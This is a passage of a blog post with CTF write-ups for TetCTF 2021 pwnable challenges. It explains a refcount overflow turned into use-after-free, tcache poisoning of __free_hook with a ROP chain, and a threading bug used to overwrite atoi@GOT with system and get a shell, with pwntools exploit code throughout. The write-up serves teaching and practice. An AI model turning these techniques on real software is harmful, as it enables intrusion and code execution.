<li><code>Duplicate</code> a cache to another cache with different name, but similar content.</li>
</ul>
<p>This time, there is no hashing to mess with. Also, the pointer to the content of each cache is now managed by C++ <code>unique_ptr</code>. In short, <code>unique_ptr</code> will manage a pointer inside itself, and uniquely own it. There is no way other smart pointers can refer to a pointer that a <code>unique_ptr</code> is managing.</p>
<p>When a cache is duplicated, the method <code>reference()</code> will be called to increase <code>refCount</code> by 1, and when it is erased, <code>release()</code> will be called to decrease <code>refCount</code> by 1. If <code>refCount</code> reaches 0, it means that the cache is no longer referred by any existing cache, therefore it will be deleted, along with its <code>unique_ptr</code>. There is a bound check that a cache can only be referenced upto <code>UINT8_MAX</code>, but here is the bug: the <code>refCount</code>&rsquo;s data type itself is <code>uint8_t</code>, so it will never surpass that max, instead, it will <code>overflow</code> and go back to 0. Therefore, we can <code>duplicate</code> a cache 256 times to make <code>refCount</code> rolls back to 1, then <code>erase</code> it. Doing that leaves us with an erased cache that has a lot of duplicates referencing to it. This leads to a <code>use-after-free</code> bug upon accessing any of those duplicates.</p>
<h3 id="erasing-an-overflowed-cache">Erasing an overflowed cache</h3>
<p>When we erase a cache, it&rsquo;s <code>unique_ptr</code> will also be erased. This structure is also stored on the heap, and the important part is that the pointer that it is managing is stored as the second <code>QWORD</code> of the struct. The <code>unique_ptr</code> struct is small enough that it will be inserted into <code>tcache</code> when it&rsquo;s free, and in <code>libc 2.31</code>, when a <code>tcache</code> is free, it&rsquo;s second <code>QWORD</code> will contain a so-called <code>key</code>, which is the pointer to <code>tcache_perthread_struct</code> at the start of the heap. Therefore, when we <code>.get()</code> from this freed <code>unique_ptr</code>, we actually have access to the pointer to that start of the heap. It all happens when we <code>erase</code> a large cache whose <code>refCount</code> is overflowed, and then we can read/write in a very large range from it. So effectively, we can read and write anywhere on the heap from that point.</p>
<h3 id="setup-the-heap-1">Setup the heap</h3>
<p>Again, like <code>cache_v1</code>, we setup the heap perfectly for our exploitation, then overflow and erase a large cache:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">## Create a victim caches</span>
<span class="n">create</span><span class="p">(</span><span class="s2">&#34;victim1&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="s2">&#34;victim1&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">create</span><span class="p">(</span><span class="s2">&#34;victim2&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="s2">&#34;victim2&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="c1">## Create a large cache to duplicate over and over</span>
<span class="n">create</span><span class="p">(</span><span class="s2">&#34;orig&#34;</span><span class="p">,</span> <span class="mh">0x18000</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="s2">&#34;orig&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="c1">## Duplicate orig 256 times</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
    <span class="c1">##print(i)</span>
    <span class="n">duplicate</span><span class="p">(</span><span class="s2">&#34;orig&#34;</span><span class="p">,</span> <span class="s2">&#34;dup_{}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>

<span class="c1">## Erase dup_0, orig&#39;s unique_ptr will now point at tcache_perthread_struct (top of heap)</span>
<span class="n">erase</span><span class="p">(</span><span class="s2">&#34;dup_0&#34;</span><span class="p">)</span>
</code></pre></div><p>Notice that I created the <code>victim</code> caches first, because it will make them closer to the top, we don&rsquo;t want them to be far after those duplicated caches. The targeted cache size is also set to be very large (<code>0x18000</code>). Also, I deleted <code>dup_0</code> instead of <code>orig</code>, because <code>orig</code> is the only one that we can safely read and write from (it&rsquo;s not flagged as a duplicate).</p>
<h3 id="leak-heap-and-libc-1">Leak heap and libc</h3>
<p>Simply read a <code>heap</code> and a <code>libc</code> pointer on the heap, we don&rsquo;t even need to free a large chunk this time because the targeted chunk is already a large one and will be inserted to <code>unsorted bin</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">## Leak heap</span>
<span class="n">read</span><span class="p">(</span><span class="s2">&#34;orig&#34;</span><span class="p">,</span> <span class="mh">0x11ea8</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x11ed0</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;heap: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)))</span>

<span class="c1">## Leak libc</span>
<span class="n">read</span><span class="p">(</span><span class="s2">&#34;orig&#34;</span><span class="p">,</span> <span class="mh">0x12238</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
<span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;libc: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">address</span><span class="p">)))</span>
</code></pre></div><h3 id="tcache-poisoning-1">Tcache poisoning</h3>
<p>Exactly the same as <code>cache_v1</code>: Freeing the two <code>victim</code> chunks and we can easily overwrite their <code>fd</code> pointer, classic <code>tcache poisoning</code>. With that, I now can overwrite <code>__free_hook</code> and also have all the leaked addresses in my hands. I could just use my ROP chain that I explained <a href="https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/" target="_blank" rel="noopener noreffer">here</a> to read the flag. Note that the <code>payload</code> must be put into a cache&rsquo;s <code>name</code>, not <code>content</code>, because the <code>name</code> is what actually got <code>free()</code> first when we call <code>erase</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">## Erase victims, overwrite victim2&#39;s fd to __free_hook</span>
<span class="n">erase</span><span class="p">(</span><span class="s2">&#34;victim1&#34;</span><span class="p">)</span>
<span class="n">erase</span><span class="p">(</span><span class="s2">&#34;victim2&#34;</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="s2">&#34;orig&#34;</span><span class="p">,</span> <span class="mh">0x120b0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__free_hook&#34;</span><span class="p">]))</span>

<span class="c1">## Build ROP payload</span>
<span class="n">base</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2d190</span>             <span class="c1">## payload_base (address of the chunk)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span>                  <span class="c1">## &lt;-- [rdi] &lt;-- payload_base</span>
<span class="o">...</span> <span class="c1">## read the full payload in my other post or my full script</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;/home/cache/flag&#34;</span>

<span class="c1">## Create a cache with payload as its name</span>
<span class="n">create</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="c1">## Overwrite __free_hook with call_gadget</span>
<span class="n">create</span><span class="p">(</span><span class="s2">&#34;free&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="s2">&#34;free&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_gadget</span><span class="p">))</span>

<span class="c1">## Execute the chain</span>
<span class="n">erase</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div><p>The flag is:</p>
<pre><code>TetCTF{https://www.youtube.com/watch?v=RYhKUKzD6IQ}
</code></pre><h3 id="appendix-1">Appendix</h3>
<p>The full exploit is <a href="/posts/20210103-tetctf2021-writeups/cache_v2/a.py" rel="">a.py</a>.</p>
<hr>
<h2 id="simplesystem">SimpleSystem</h2>
<h3 id="introduction-2">Introduction</h3>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ul>
<li><strong>Given files:</strong> <a href="/posts/20210103-tetctf2021-writeups/SimpleSystem/SimpleSystem" rel="">SimpleSystem</a>, <a href="/posts/20210103-tetctf2021-writeups/SimpleSystem/libc-2.23.so" rel="">libc-2.23.so</a>.</li>
<li><strong>Category:</strong> Pwnable</li>
<li><strong>Hint</strong>: <code>do you know an arena can be reused when arena list is full ?</code></li>
<li><strong>Summary:</strong> A glibc 2.23 heap challenges that is very unique. It is a simple system (as the name suggest) that we can signup, signin and use its functionalities, it utilizes multithreading to implement them. The bug is in the synchronization implementation of multithreading, and the exploitation relies on how glibc handles <code>malloc()</code> on multithreaded environment (although there is another intended bug in the authentication process, but it is not needed).</li>
</ul>
</div>
        </div>
    </div>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>TL;DR<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ol>
<li>Analyze the executable -&gt; Found that after signing in, if we go into sleep mode, then signout &amp; delete, then signin again, we can signin to a deleted session due to a failed implementation of synchronization <code>semaphore</code>.</li>
<li>Create a lot of users, signin to 1 of them and use the above bug -&gt; leak <code>libc</code> when <code>show_info</code>.</li>
<li>Signin to 8 others and put them to a long <code>sleep mode</code> -&gt; Use maximum number of <code>heap arenas</code>.</li>
<li>Use the above bug on the 1st user again -&gt; the <code>bk</code> pointer of an unsorted bin actually set the <code>is_admin</code> flag to <code>true</code>.</li>
<li>Create 7 notes to fill up the other <code>arenas</code> -&gt; 8th note will be in <code>main arena</code> -&gt; Overlap on <code>session</code> itself.</li>
<li>Overwrite <code>session-&gt;fullname</code> to leak <code>heap</code>.</li>
<li>Edit note to overwrite <code>session-&gt;head</code>, edit again to overwrite <code>atoi@GOT</code> into <code>system()</code>.</li>
<li>Input <code>sh</code> into choice prompt -&gt; Get shell.</li>
</ol>
</div>
        </div>
    </div>
<h3 id="analyzing-the-binary">Analyzing the binary</h3>
<p>On startup, the program gives us 2 options:</p>
<ul>
<li><code>Signup</code> to create an account. We will be asked for a <code>fullname</code>, a <code>username</code> and a <code>password</code>. If they are valid, the <code>username</code> will be used to create a directory underneath <code>creds</code> to store 2 files <code>u.dat</code> and <code>p.dat</code>, with <code>u.dat</code> storing the full name and <code>p.dat</code> storing the <code>MD5</code> hash of the <code>password</code>.</li>
<li><code>Signin</code> to signin to an account. The program will ask for the <code>username</code> and the <code>password</code> to check if they exist. If they do, it will lookup a <code>session list</code> to see if that user is currently having a session or not, if not, it will create a session for it. It also checks if the <code>username</code> is <code>admin</code> or not to set the <code>is_admin</code> flag. The <code>session</code> struct is as follows:</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">str_session</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">padd</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
    <span class="kr">__int64</span> <span class="n">is_admin</span><span class="p">;</span>
    <span class="kr">__int64</span> <span class="n">sess_id</span><span class="p">;</span>
    <span class="n">pthread_mutex_t</span> <span class="n">mutex_lock</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">fullname</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span>
    <span class="kr">__int64</span> <span class="n">note_id</span><span class="p">;</span>
    <span class="n">str_note</span><span class="o">*</span> <span class="n">head</span><span class="p">;</span>
    <span class="n">str_note</span><span class="o">*</span> <span class="n">tail</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><em>Actually, as the author <code>@d4rkn3ss</code> reveals, there is a path truncation bug in the authentication process that can let you login to anything and read any file. With this you can leak every addresses through <code>/proc/self/maps</code>, leak <code>admin</code>&rsquo;s hashed password to crack it, and leak the number of CPUs through <code>/proc/cpuinfo</code>. But I still managed to solve this without using this bug.</em></div>
        </div>
    </div>
<p>After logging in, we have 6 options to choose from, each of these actions will be run on a separate thread, synchronized by a <code>mutex_lock</code> within each <code>session</code> and a global <code>semaphore</code>:</p>
<ol>
<li><code>Add</code> a note. This can only be performed as an <code>admin</code>, the note size can be up to <code>0xFFFF</code> and notes are stored as a linked list.</li>
<li><code>Edit</code> a note. This also can only be performed as <code>admin</code>.</li>
<li><code>Show</code> user info. This shows the user&rsquo;s fullname and notes.</li>
<li><code>Sleep</code> mode. This puts the current thread to <code>sleep()</code> for the inputted amount of time (in seconds).</li>
<li><code>Signout &amp; delete</code>: signout of the current <code>session</code> and delete it, freeing everything its own.</li>
<li><code>Signout</code>: signout of the current <code>session</code>, but still keep it in the <code>session list</code>.</li>
</ol>
<p>This is the struct of a <code>note</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">str_note</span>
<span class="p">{</span>
    <span class="n">str_note</span><span class="o">*</span> <span class="n">next</span><span class="p">;</span>
    <span class="kr">__int64</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">content</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The bug here is that even though in <code>signout &amp; delete</code> the program tries to acquire the <code>mutex_lock</code>, it doesn&rsquo;t call <code>sem_wait()</code> on the <code>semaphore</code> on the way out and goes straight into <code>sem_destroy()</code>. This way, if we go into <code>sleep mode</code>, the <code>mutex_lock</code> will be acquired and <code>sem_post()</code> will increment <code>semaphore</code> before <code>sleep()</code>, after that when we choose to <code>signout &amp; delete</code>, this thread must wait for the <em>sleeping thread</em> to unlock its <code>mutex_lock</code> before it can execute, but the thing is on the main thread after <code>signout &amp; delete</code>, it doesn&rsquo;t need to wait for the <code>semaphore</code> of the sleeping thread to be incremented before proceeding, therefore it will signout to the main menu on the <em>main thread</em>, while the <em>deleting thread</em> is still waiting for the <code>mutex_lock</code>. In short, we have 3 threads here:</p>
<ul>
<li>the <em>sleeping thread</em> holding the <code>mutex_lock</code>, incrementing the <code>semaphore</code>.</li>
<li>the <em>deleting thread</em> waiting for <code>mutex_lock</code> to be released to proceed.</li>
<li>the <em>main thread</em>, which should be waiting for the <code>semaphore</code>, is instead ignoring it and signout to main menu.</li>
</ul>
<p>Using this bug, we can: <code>signin -&gt; sleep -&gt; signout &amp; delete -&gt; signin</code> to sign back into a deleted session. Notice that the <code>is_admin</code> flag in the <code>session</code> struct is located at the 2nd <code>QWORD</code>, it will be overwrited by the <code>bk</code> pointer of an unsorted bin, therefore we have a &ldquo;fake&rdquo; <code>admin</code> in this deleted session. Also the <code>fullname</code> chunk is freed, so we can <code>show</code> info to leak the <code>libc</code> address from it.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">## Leak libc with synchronization bug -&gt; UAF</span>
<span class="n">signin</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="n">sleep_thread</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">signout_delete</span><span class="p">()</span>
<span class="n">signin</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Your name: &#34;</span><span class="p">)</span>
<span class="n">l</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;libc: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">address</span><span class="p">)))</span>
</code></pre></div><h3 id="exploit-the-multithreaded-heap">Exploit the multithreaded heap</h3>
<p>The exploitation path is quite clear then: if we can <code>add</code> a note exactly the same size as a <code>session</code> struct, then it will be allocated at the freed <code>session</code> we are currently in and we can overwrite everything in it. But here is the big problem: Each thread will <code>malloc()</code> into its own <code>heap arena</code>, so initially, it seems like there are no way to <code>malloc()</code> into the <code>main arena</code> from another thread.</p>
<p>That&rsquo;s when the <strong>hint</strong> comes in handy. By googling about this multithreading heap management stuff, I came into <a href="https://sourceware.org/glibc/wiki/MallocInternals" target="_blank" rel="noopener noreffer">this doc about MallocInternals</a>. It says that the maximum number of heap arenas is <code>8 * number-of-processors</code>. After all the arenas have been allocated, threads will try to reuse one of the other arenas. This is so nice because we can use <code>sleep mode</code> to create a lot of hanging threads, then try to <code>malloc()</code> into the <code>main arena</code> in the next (the author is nice enough to even make a call to <code>malloc()</code> in <code>sleep mode</code>). That&rsquo;s exactly what I did, even though the intended way is to read <code>/proc/cpuinfo</code> to know the number of processors, I just assumed that it&rsquo;s 1 and try it out (if it&rsquo;s not I could always bruteforce it, can&rsquo;t be too big anyway). Therefore I created 8 sleeping threads:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">## Fill all 8 created arenas with 8 notes</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">):</span>
    <span class="c1">##print(i)</span>
    <span class="n">signin</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">user</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="n">sleep_thread</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">100</span><span class="p">)</span>
    <span class="n">signout</span><span class="p">()</span>
</code></pre></div><p>Now the next <code>malloc()</code> should be into the <code>main arena</code>, but not really. The way allocation works after filling the arenas is weird. I haven&rsquo;t read any resource about it yet, but as I experimented it, it seems like the program cycles through each of the arena on each thread to make new allocations. I&rsquo;m not really sure about this, but what I did was doing trials-and-errors and I found that if I create 7 dummy notes, the 8th one will by in <code>main arena</code>, also set the note size to <code>0x90</code> to be the same as a <code>session</code> struct.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">## Fill all 8 created arenas with 8 notes</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Size: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Content: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1">## note 0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
    <span class="n">add_note</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1">## note 1 -&gt; 7</span>

<span class="c1">## Next note will be in main arena, overwrite freed session -&gt; overwrite full name to leak heap</span>
<span class="n">payload1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">## sess_id</span>
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100000eee</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="c1">## mutex lock</span>
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x603190</span><span class="p">)</span> <span class="c1">## full name -&gt; leak</span>
<span class="n">add_note</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> <span class="c1">## note 8</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Your name: &#34;</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x19f0</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;heap: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)))</span>
</code></pre></div><p>I used this note to overwrite <code>fullname</code> to a pointer to the <code>session list</code> (the binary has <code>No PIE</code>) to leak <code>heap</code> address. I also had to make sure that the other overwritten fields of <code>session</code> are acceptable by the process, especially the <code>mutex_lock</code> one.</p>
<h3 id="overwrite-got-and-get-shell">Overwrite GOT and get shell</h3>
<p>Now I can use <code>edit</code> to overwrite <code>str_session-&gt;head</code> to the start of <code>session</code> struct, where I created a fake <code>note</code> whose <code>str_note-&gt;content</code> points to <code>atoi@GOT</code>. Then editting this note again to overwrite <code>atoi@GOT</code> to <code>system</code>. For the next prompt to make a choice to the options, I could just pass <code>sh</code> to it, then <code>atoi(&quot;sh&quot;)</code> will be called, which actually is <code>system(&quot;sh&quot;)</code> now.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">## Edit to point to atoi@GOTS</span>
<span class="n">payload2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">b</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;atoi&#34;</span><span class="p">])</span> <span class="c1">## sess_id</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100000eee</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="c1">## mutex lock</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">## full name</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span> <span class="c1">## username</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">## note_id</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xe90</span><span class="p">)</span> <span class="c1">## head</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xe90</span><span class="p">)</span> <span class="c1">## tail</span>
<span class="n">edit_note</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>

<span class="c1">## Edit again to overwrite atoi@GOTS</span>
<span class="n">edit_note</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]))</span>

<span class="c1">## Get shell</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;choice: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">)</span>
</code></pre></div><p>The flag is:</p>
<pre><code>TetCTF{vina: *100*50421406550161##}
</code></pre><h3 id="appendix-2">Appendix</h3>
<p>The full exploit is <a href="/posts/20210103-tetctf2021-writeups/SimpleSystem/a.py" rel="">a.py</a>.</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2021-01-03</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/20210103-heap-seccomp-rop/" class="prev" rel="prev" title="Glibc 2.31 Heap &#43; Seccomp Exploitation Technique using ROP"><i class="fas fa-angle-left fa-fw"></i>Glibc 2.31 Heap &#43; Seccomp Exploitation Technique using ROP</a>
            <a href="/posts/20210123-linux-kernel-pwn-part-1/" class="next" rel="next" title="Learning Linux Kernel Exploitation - Part 1">Learning Linux Kernel Exploitation - Part 1<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":60},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-HGQHGNF9HJ');
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-HGQHGNF9HJ" async></script></body>
</html>
